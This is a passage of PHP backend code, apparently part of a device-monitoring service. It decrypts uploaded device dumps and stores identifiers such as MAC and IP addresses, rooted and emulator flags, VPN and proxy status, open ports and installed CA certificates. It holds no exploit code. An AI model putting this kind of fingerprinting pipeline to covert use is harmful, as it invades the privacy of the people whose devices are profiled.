                'language'                    => $json['language']                    ?? null,
                'country'                     => $json['country']                     ?? null,
                'timezone'                    => $json['timezone']                    ?? null,
                'timezone_offset'             => $json['timezone_offset']             ?? null,
                'current_time'                => $json['current_time']                ?? null,
                'current_time_formatted'      => $json['current_time_formatted']      ?? null,
                'battery_charging'            => isset($json['battery_charging'])     ? ($json['battery_charging'] ? 1 : 0) : null,
                'battery_level'               => $json['battery_level']              ?? null,
                'sensor_count'                => $json['sensor_count']               ?? null,
                'mac_address'                 => $json['mac_address']                ?? null,
                'kernel_info'                 => $json['kernel_info']                ?? null,
                'is_emulator'                 => isset($json['is_emulator'])          ? ($json['is_emulator'] ? 1 : 0) : null,
                'is_rooted'                   => isset($json['is_rooted'])            ? ($json['is_rooted'] ? 1 : 0) : null,
                'app_package'                 => $json['app_package']                ?? null,
                'app_version'                 => $json['app_version']                ?? null,
                'app_version_code'            => $json['app_version_code']           ?? null,
                'app_first_install'           => $json['app_first_install']          ?? null,
                'app_last_update'             => $json['app_last_update']            ?? null,
                'extraction_timestamp'        => $extracted_at,
                'extractor_version'           => $json['extractor_version']          ?? '1.0',
                'device_ip_address'           => $json['device_ip_address']          ?? null,
            ];

            $this->db->table('tbl_device_profile')->insert($data);
            log_message('info', '[parse_device_info] Inserted device snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * SecurityAuditExtractor → tbl_security_audit
     * File category: security_audit / securityaudit
     * Stores VPN/proxy status, open ports and user-installed CA certificates.
     */
    public function parse_security_audit(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated      = date('Y-m-d H:i:s');

            $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($raw === false) {
                log_message('error', '[parse_security_audit] Cannot read file: ' . $file_name);
                return false;
            }

            $decoded = $cryptModel->decode_content($raw);
            if ($decoded === false) {
                log_message('error', '[parse_security_audit] Decryption failed for: ' . $file_name);
                return false;
            }

            $json = json_decode($decoded, true);
            if ($json === null) {
                log_message('error', '[parse_security_audit] JSON decode failed: ' . json_last_error_msg());
                return false;
            }

            $audit_timestamp = $json['timestamp'] ?? null;
            $extracted_at    = $audit_timestamp;

            // Encode arrays as JSON strings for storage
            $user_ca_certs = $json['user_ca_certs'] ?? null;
            if (is_array($user_ca_certs)) {
                $user_ca_certs = json_encode($user_ca_certs);
            }

            $open_ports = $json['open_ports'] ?? null;
            if (is_array($open_ports)) {
                $open_ports = json_encode($open_ports);
            }

            $data = [
                'owner_id'           => $owner_id,
                'device_id'          => $device_id,
                'vpn_active'         => isset($json['vpn_active'])   ? ($json['vpn_active']   ? 1 : 0) : 0,
                'proxy_active'       => isset($json['proxy_active'])  ? ($json['proxy_active']  ? 1 : 0) : 0,
                'user_ca_certs_json' => $user_ca_certs,
                'open_ports_json'    => $open_ports,
                'audit_timestamp'    => $audit_timestamp,
                'extracted_at'       => $extracted_at,
                'created_at'         => $dated,
            ];

            $this->db->table('tbl_security_audit')->insert($data);
            log_message('info', '[parse_security_audit] Inserted audit snapshot for device: ' . $device_id);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_security_audit] Exception: ' . $e->getMessage());
            return false;
        }
    }

}
